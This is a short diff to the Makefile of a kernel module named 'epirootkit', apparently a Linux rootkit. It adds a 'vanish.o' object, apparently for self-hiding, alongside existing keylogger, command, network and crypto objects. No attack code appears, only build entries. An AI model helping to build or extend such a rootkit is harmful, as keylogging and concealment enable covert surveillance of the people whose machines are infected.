@@ -20,6 +20,7 @@ epirootkit-objs :=                              \
     file_ops.o                                  \
     epikeylog.o                                 \
     rootkit_command.o                           \
+    vanish.o                                    \
 	crypto/hash.o                               \
 	crypto/aes.o                                \
     network/core/network.o                      \
